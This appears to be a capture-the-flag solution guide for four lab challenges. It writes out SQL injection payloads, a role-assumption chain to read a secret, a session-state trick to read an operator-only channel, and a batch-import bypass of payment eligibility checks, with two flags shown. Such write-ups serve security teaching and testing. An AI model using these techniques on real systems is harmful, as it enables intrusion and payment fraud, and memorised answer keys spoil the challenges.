1. Role With It

Enumerate the console:

{"op":"help"}

{"op":"roles"}

{"op":"objects"}

{"op":"secrets"}

Discover the get request format:

{"op":"get"}

Retrieve the release notes:

{"op":"get","object":"docs/release-notes"}

Record the returned helper role, project, and integration ID. Inspect the helper policy:

{"op":"policy","role":"HELPER_ROLE"}

Assume that role using the policy requirements:

{"op":"assume","role":"HELPER_ROLE","external_id":"INTEGRATION_ID","tags":{"project":"PROJECT","team":"release"}}

Confirm the current identity:

{"op":"whoami"}

Retrieve the job schema:

{"op":"get","object":"docs/job-schema"}

Inspect the workload role returned by the schema:

{"op":"policy","role":"WORKLOAD_ROLE"}

Record the protected resource and run the job:

{"op":"jobs.run","execution_role":"WORKLOAD_ROLE","task":"read-secret","resource":"SECRET_PATH"}

The output field contains the flag.

======================================================================

2. Stock Override

Start with:

HELP;

Review the clues:

SHOW SAMPLES;
SHOW NOTES;
SHOW CHECKER;

The outputs establish that:

• CHECK accepts a SKU.
• Historical inventory is excluded from normal searches.
• Internal recovery SKUs begin with RECOVERY-.
• % matches remaining characters in a SQL pattern.
• The supplied SKU is inserted into a quoted SQL lookup.

Confirm normal behavior:

CHECK 'PEN-01';

CHECK 'OLD-01';

The first command returns an active record. The second returns NOT FOUND because OLD-01 is archived.

Confirm that the query logic can be changed:

CHECK '' OR 1=1 -- ';

A broad recovery-pattern test returns the active decoy:

CHECK '' OR (sku LIKE 'RECOVERY-%') -- ';

Expected decoy:

SKU RECOVERY-GUIDE
DESCRIPTION Recovery handling guide

Combine the historical-status clue with the recovery naming convention:

CHECK '' OR (active=0 AND sku LIKE 'RECOVERY-%') -- ';

The response reveals the generated archived recovery SKU:

FOUND
SKU RECOVERY-XXXXXX
DESCRIPTION Internal stock recovery item

Submit the actual returned SKU:

CLAIM 'RECOVERY-XXXXXX';

The console returns the flag as Base64:

RECOVERY ITEM ACCEPTED
ENCODING base64
DATA <BASE64_VALUE>

Decode only the value after DATA. For example:

printf '%s' '<BASE64_VALUE>' | base64 -d

The decoded value is:

flag{inm_active_filters_are_not_access_controls}


3. State of Confusion
Enumerate the gateway and inspect its banner:

HELP
SHOW BANNER

Negotiate the required protocol:

HELLO MUX/2

Discover and use the laboratory guest profile:

SHOW USERS
LOGIN guest guest

Save the returned ticket. Enumerate the channels:

LIST CHANNELS

Attempt to select the operator-only channel:

SELECT CONTROL_CHANNEL

The gateway denies access and clears authentication, but the selected channel remains in session state. Confirm that state:

STATUS

Resume the original ticket:

RESUME ORIGINAL_TICKET

Read the still-selected restricted channel:

READ

The response contains the flag.

======================================================================

4. Cleared by Existence
Enumerate the interfaces

HELP
SHOW OBJECTIVE
SHOW ACCOUNTS
SHOW API
SHOW IMPORT FORMAT

Record these values:

• The account labeled PENDING ACCOUNT
• The objective amount of 1200000 minor units
• The currency KES
• The documented JSON schema

Test the direct path

Use the actual pending account number:

CREATE PAYMENT ACCOUNT PENDING_ACCOUNT AMOUNT 1200000

Expected result:

403 BENEFICIARY NOT ELIGIBLE
STATUS PENDING
CAN-RECEIVE false
VALIDATION PATH direct-api

This establishes that the direct interface enforces beneficiary eligibility.

Build the import document

Create a compact JSON document using the pending account and objective amount. The settlement reference must contain 3 to 64 letters, numbers, underscores, or hyphens.

{"version":1,"payments":[{"reference":"SETTLEMENT_001","account":"PENDING_ACCOUNT","currency":"KES","amount_minor":1200000}]}

Replace PENDING_ACCOUNT with the actual account number before encoding the JSON as Base64.

Example on Linux:

printf '%s' '{"version":1,"payments":[{"reference":"SETTLEMENT_001","account":"PENDING_ACCOUNT","currency":"KES","amount_minor":1200000}]}' | base64 -w 0

The challenge accepts standard Base64 with or without final padding.

Import through the alternate interface

Submit the encoded value using the syntax listed by HELP and SHOW API:

IMPORT BATCH BASE64_VALUE

Expected response:

202 BATCH ACCEPTED
PAYMENT P-XXXXXXXX
REFERENCE SETTLEMENT_001
ACCOUNT PENDING_ACCOUNT
AMOUNT MINOR 1200000
VALIDATION PATH batch-import
VALIDATION RESULT account-exists
STATUS QUEUED

The important inconsistency is:

direct-api   -> beneficiary eligibility
batch-import -> account existence only

Commit the imported payment

Inspect the queue if needed:

SHOW QUEUE
SHOW PAYMENT PAYMENT_ID

Commit the payment ID returned by the import:

COMMIT PAYMENT PAYMENT_ID

Successful result:

200 PAYMENT COMMITTED
CREDITED MINOR 1200000
flag{inm_exists_does_not_mean_eligible}

Duplicate-reference behavior

A second imported payment using the same reference, including a case variation, returns:

409 DUPLICATE SETTLEMENT REFERENCE

Use a different reference for another import attempt.
